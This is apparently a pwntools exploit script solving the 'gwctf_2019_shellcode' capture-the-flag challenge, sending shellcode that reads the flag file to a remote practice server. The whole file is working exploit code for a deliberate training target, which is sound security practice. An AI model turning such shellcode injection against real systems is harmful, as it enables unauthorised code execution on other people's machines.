from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.buuoj.cn",28275)
# io=process("./gwctf_2019_shellcode")
# elf=ELF("gwctf_2019_shellcode")

# io.recv()
payload=asm('xor eax,0x4141')+asm(shellcraft.cat("flag"))

# gdb.attach(io)
# pause()

io.sendline(payload)

io.interactive()